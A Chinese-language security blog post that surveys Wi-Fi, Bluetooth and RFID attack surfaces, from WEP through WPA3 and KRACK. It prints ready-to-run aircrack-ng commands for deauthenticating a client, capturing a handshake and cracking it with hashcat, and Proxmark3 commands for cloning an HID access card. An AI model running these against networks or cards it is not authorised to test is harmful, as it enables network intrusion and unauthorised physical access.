---
slug: "hacker-11-wireless"
title: "[WIRELESS] 无线安全：从 WPA3 到蓝牙攻击面"
date: "2025-08-06"
tags: ["wireless", "wifi", "bluetooth", "rf", "security"]
summary: "> 无线信号穿墙而过，也穿过了你的安全边界。盘点 Wi-Fi、蓝牙、RFID 的攻防技术全景。"
cover: ""
cover_ascii: ""
word_count: 0
---

# [WIRELESS] 无线安全：从 WPA3 到蓝牙攻击面

```
┌─────────────────────────────────────────────────────────────┐
│  ██╗    ██╗██╗██████╗ ███████╗██╗     ███████╗███████╗     │
│  ██║    ██║██║██╔══██╗██╔════╝██║     ██╔════╝██╔════╝     │
│  ██║ █╗ ██║██║██████╔╝█████╗  ██║     █████╗  ███████╗     │
│  ██║███╗██║██║██╔══██╗██╔══╝  ██║     ██╔══╝  ╚════██║     │
│  ╚███╔███╔╝██║██║  ██║███████╗███████╗███████╗███████║     │
│   ╚══╝╚══╝ ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝     │
│                                                             │
│              "Your signal is my access point"               │
└─────────────────────────────────────────────────────────────┘
```

## 1. Wi-Fi 安全协议演进

```
WEP (1999)
  └─ RC4 + 24-bit IV → 数分钟内可破解
WPA (2003)
  └─ TKIP + RC4 → 临时补救，仍不安全
WPA2 (2004)
  └─ AES-CCMP → 长期主流，但 KRACK 攻击暴露了 4-way handshake 缺陷
WPA3 (2018)
  └─ SAE (Dragonfly) + 192-bit CNSA → 当前最安全
  └─ 但 Dragonblood 漏洞 (2019) 证明没有银弹
```

## 2. WPA2 四次握手与 KRACK 攻击

```
    客户端 (STA)                      AP
        │                              │
        │──── 1. ANonce ──────────────>│
        │<─── 2. SNonce + MIC ────────│
        │──── 3. GTK + MIC ──────────>│
        │<─── 4. ACK ─────────────────│
        │                              │
        └── PTK 派生完成, 加密通信开始 ──┘

KRACK 攻击原理:
  攻击者重放 Message 3 → 强制客户端重新安装已使用的 PTK
  → Nonce 重置 → 密钥流复用 → 数据包可解密
```

## 3. 无线渗透工具链

```bash
# 1. 进入监听模式
sudo airmon-ng start wlan0
# 此时接口变为 wlan0mon

# 2. 扫描周围 AP 和客户端
sudo airodump-ng wlan0mon

# 3. 针对目标 AP 抓包
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 4. 对目标客户端发起 Deauth 攻击（抓握手包）
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# 5. 使用 Hashcat 离线破解握手包
# 先转换为 hashcat 格式
hcxpcapngtool -o capture.22000 capture.cap
# 字典攻击
hashcat -m 22000 capture.22000 rockyou.txt
```

## 4. 蓝牙攻击面

```
蓝牙协议栈攻击向量:
┌──────────────────────────────────────────────────────┐
│  BlueBorne (2017)                                     │
│  └─ 无需配对，无需交互，空中远程代码执行               │
│  └─ 影响: Android, iOS, Windows, Linux, IoT           │
│                                                       │
│  BIAS (2020)                                          │
│  └─ 冒充已配对设备，绕过蓝牙认证                       │
│  └─ 利用 Legacy Authentication 降级                   │
│                                                       │
│  BLESA (2020)                                         │
│  └─ BLE 重连时的欺骗攻击                              │
│  └─ 影响: 几乎所有 BLE 设备                           │
├──────────────────────────────────────────────────────┤
│  Bluetooth 扫描工具:                                   │
│  hciconfig / hcitool / bluetoothctl / bettercap        │
│  BLE: gatttool / bleah / nRF Connect                   │
└──────────────────────────────────────────────────────┘
```

## 5. RFID / NFC 安全

| 频段 | 典型应用 | 安全风险 |
|------|---------|---------|
| 125 kHz (LF) | 门禁卡、动物标签 | 无加密，可克隆 |
| 13.56 MHz (HF) | NFC、MIFARE | Classic 已破解，Crypto-1 太弱 |
| 860-960 MHz (UHF) | 物流、仓储 | 远距离读取，隐私泄露 |

```bash
# Proxmark3 克隆门禁卡
proxmark3> lf search              # 识别低频卡类型
proxmark3> lf hid read            # 读取 HID 卡数据
proxmark3> lf hid clone <ID>      # 克隆到空白卡
```

---

```
[WIRELESS] 信号覆盖范围: 肉眼不可见，攻击面不可见
[WIRELESS] 防御核心: 最小化信号暴露 + 强加密 + 持续监控
[WIRELESS] 原则: 如果你不需要无线，关闭它
```